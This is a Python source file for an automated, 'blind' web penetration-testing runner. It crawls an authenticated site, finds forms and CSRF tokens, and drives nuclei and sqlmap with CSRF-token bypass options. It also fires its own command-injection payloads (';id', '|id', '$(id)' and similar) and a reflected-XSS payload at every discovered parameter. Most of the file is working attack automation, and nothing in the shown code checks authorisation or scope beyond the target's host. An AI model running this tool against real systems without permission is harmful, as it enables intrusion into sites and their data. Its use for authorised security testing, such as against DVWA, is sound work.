"""Blind engagement runner: the real-world flow, with no hand-fed endpoints.

  crawl (blind, authenticated, logout-safe)
    -> discover forms + CSRF tokens
    -> build injection targets (url, method, params, csrf)
    -> run tools form-aware and CSRF-aware (each param tested)
    -> verify findings by deterministic replay (kill FPs)
    -> score

This is what runs against a real target: it does not know where the vulnerabilities are.
CSRF handling gets past per-request tokens on hardened forms; form-awareness tests POST
params; verification confirms each hit so a payload-set gap in one tool is caught by another
and false positives never reach the report.
"""

from __future__ import annotations

import subprocess
import tempfile
from dataclasses import dataclass, field
from urllib.parse import urlsplit

from .orchestrator.forms import fetch_forms


@dataclass
class Target:
    url: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    values: dict = field(default_factory=dict)
    csrf_field: str | None = None
    csrf_url: str = ""

    def data_string(self, mark: str = "1") -> str:
        return "&".join(f"{p}={self.values.get(p) or mark}" for p in self.params)


@dataclass
class Finding:
    tool: str
    category: str
    url: str
    param: str | None = None
    method: str = "GET"
    evidence: str = ""
    verified: bool | None = None       # None=unverified, True=confirmed, False=refuted
    verify_note: str = ""


def _run(args: list[str], timeout: int, stdin: str | None = None) -> str:
    try:
        p = subprocess.run(args, input=stdin, capture_output=True, text=True,
                           timeout=timeout, check=False)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as exc:  # noqa: BLE001
        return f"__EXEC_ERROR__ {exc}"


# ----- discovery --------------------------------------------------------------

def blind_crawl(target: str, cookie: str, depth: int = 3, duration: str = "3m") -> list[str]:
    """katana blind crawl (logout-safe, host-scoped, plain-URL output)."""
    args = ["katana", "-u", target, "-jc", "-silent", "-d", str(depth), "-ct", duration,
            "-cos", "logout|signout|/setup|reset", "-fs", "fqdn", "-kf", "all", "-c", "10"]
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    out = _run(args, timeout=600)
    urls = sorted({ln.strip() for ln in out.splitlines() if ln.strip().startswith("http")})
    return urls


def discover_targets(urls: list[str], cookie: str, host: str) -> list[Target]:
    """Turn crawled URLs into injection targets: GET URLs with query params, and every
    discovered form (POST/GET) with its CSRF token."""
    targets: list[Target] = []
    seen: set = set()

    for u in urls:
        parts = urlsplit(u)
        if parts.query and (parts.hostname or host) == host:
            params = sorted({kv.split("=")[0] for kv in parts.query.split("&") if kv})
            key = (parts.path, "GET", tuple(params))
            if key not in seen:
                seen.add(key)
                targets.append(Target(url=u, method="GET", params=params))

    # forms (fetch each unique page once)
    for page in sorted({u.split("?")[0] for u in urls}):
        if (urlsplit(page).hostname or host) != host:
            continue
        for f in fetch_forms(page, cookie):
            ip = f.injectable_params()
            if not ip:
                continue
            key = (urlsplit(f.action).path, f.method, tuple(sorted(ip)))
            if key in seen:
                continue
            seen.add(key)
            targets.append(Target(url=f.action, method=f.method, params=ip, values=f.values,
                                  csrf_field=f.csrf_field, csrf_url=f.csrf_url))
    return targets


# ----- verification (deterministic replay) ------------------------------------

def verify_cmdi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Replay a command-injection marker across common separators (incl. the bare-pipe
    bypass that DVWA-high allows). Confirms by the `id` command output signature."""
    import httpx
    seps = [";id", "|id", "| id", "&&id", "%0aid", "`id`", "$(id)"]
    headers = {"Cookie": cookie} if cookie else {}
    for sep in seps:
        payload = f"127.0.0.1{sep}"
        try:
            if method == "POST":
                r = httpx.post(url, data={param: payload, "Submit": "Submit"},
                               headers=headers, follow_redirects=True, timeout=12)
            else:
                r = httpx.get(url, params={param: payload}, headers=headers,
                              follow_redirects=True, timeout=12)
        except Exception:  # noqa: BLE001, S112
            continue
        if "uid=" in r.text and "gid=" in r.text:
            return True, f"cmd exec confirmed via '{sep}' (uid= in response)"
    return False, "no command output on replay"


def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    import httpx
    marker = "dxsc9k1z"
    payload = f"<sVg/onload=alert({marker})>"
    headers = {"Cookie": cookie} if cookie else {}
    try:
        if method == "POST":
            r = httpx.post(url, data={param: payload}, headers=headers,
                           follow_redirects=True, timeout=12)
        else:
            r = httpx.get(url, params={param: payload}, headers=headers,
                          follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    # confirmed only if the payload is reflected UN-encoded (real XSS, not encoded echo)
    if payload in r.text:
        return True, "payload reflected unencoded"
    if marker in r.text and "&lt;" in r.text:
        return False, "reflected but HTML-encoded (not exploitable)"
    return False, "not reflected"


def verify_finding(f: Finding, cookie: str) -> Finding:
    if f.category == "command-injection":
        ok, note = verify_cmdi(f.url, f.param or "ip", f.method, cookie)
    elif f.category == "xss":
        ok, note = verify_reflected_xss(f.url, f.param or "", f.method, cookie)
    else:
        # sql-injection and others: trust the tool's own confirmation (sqlmap/ghauri only
        # report confirmed injections); mark verified by-tool.
        f.verified = None
        f.verify_note = "tool-confirmed (no independent replay for this class yet)"
        return f
    f.verified = ok
    f.verify_note = note
    return f


# ----- detection (tool runners, form + CSRF aware) ----------------------------

def run_nuclei_dast(urls: list[str], cookie: str) -> list[Finding]:
    if not urls:
        return []
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("\n".join(urls)); path = fh.name
    args = ["nuclei", "-l", path, "-dast", "-jsonl", "-silent"]
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    out = _run(args, timeout=1800)
    from .scoring.normalize import normalize_nuclei
    return [Finding(tool="nuclei", category=n.category, url=n.url, param=n.param,
                    evidence=(n.raw.get("info", {}) or {}).get("name", ""))
            for n in normalize_nuclei(out)]


def run_sqlmap(t: Target, cookie: str) -> list[Finding]:
    """CSRF-aware sqlmap: passes --csrf-token/--csrf-url when the form carries a token."""
    args = ["sqlmap", "--batch", "--level", "2", "--risk", "2", "--disable-coloring",
            "--flush-session", "--technique=BEUST"]
    if t.method == "POST":
        args += ["-u", t.url, "--data", t.data_string()]
    else:
        args += ["-u", f"{t.url}?{t.data_string()}" if "?" not in t.url else t.url]
    if cookie:
        args += ["--cookie", cookie]
    if t.csrf_field:
        args += ["--csrf-token", t.csrf_field, "--csrf-url", t.csrf_url]
    out = _run(args, timeout=900)
    from .scoring.normalize import normalize_sqlmap
    return [Finding(tool="sqlmap", category="sql-injection", url=t.url, param=n.param,
                    method=t.method, evidence="sqlmap-confirmed")
            for n in normalize_sqlmap(out)]


def probe_targets(targets: list[Target], cookie: str) -> list[Finding]:
    """Completeness safety-net: independently replay cmd-injection and XSS on every discovered
    target, so a payload-set gap in a scanner does not become a missed finding."""
    out: list[Finding] = []
    for t in targets:
        for param in t.params:
            okc, notec = verify_cmdi(t.url, param, t.method, cookie)
            if okc:
                out.append(Finding(tool="verify", category="command-injection", url=t.url,
                                   param=param, method=t.method, evidence=notec, verified=True))
            okx, notex = verify_reflected_xss(t.url, param, t.method, cookie)
            if okx:
                out.append(Finding(tool="verify", category="xss", url=t.url, param=param,
                                   method=t.method, evidence=notex, verified=True))
    return out


def run_engagement(target: str, cookie: str, host: str,
                   depth: int = 3) -> dict:
    """Full blind flow. Returns {urls, targets, findings} with findings verified."""
    urls = blind_crawl(target, cookie, depth=depth)
    targets = discover_targets(urls, cookie, host)

    findings: list[Finding] = []
    findings += run_nuclei_dast([t.url for t in targets if t.method == "GET" and t.params], cookie)
    for t in targets:
        if t.params:
            findings += run_sqlmap(t, cookie)
    # verify tool findings + run the independent completeness probes
    findings = [verify_finding(f, cookie) for f in findings]
    findings += probe_targets(targets, cookie)

    # dedup by (category, path, param)
    seen: set = set(); uniq: list[Finding] = []
    for f in findings:
        k = (f.category, urlsplit(f.url).path, f.param)
        if k in seen:
            continue
        seen.add(k); uniq.append(f)
    return {
        "urls": urls, "targets": len(targets),
        "findings": [f.__dict__ for f in uniq],
    }
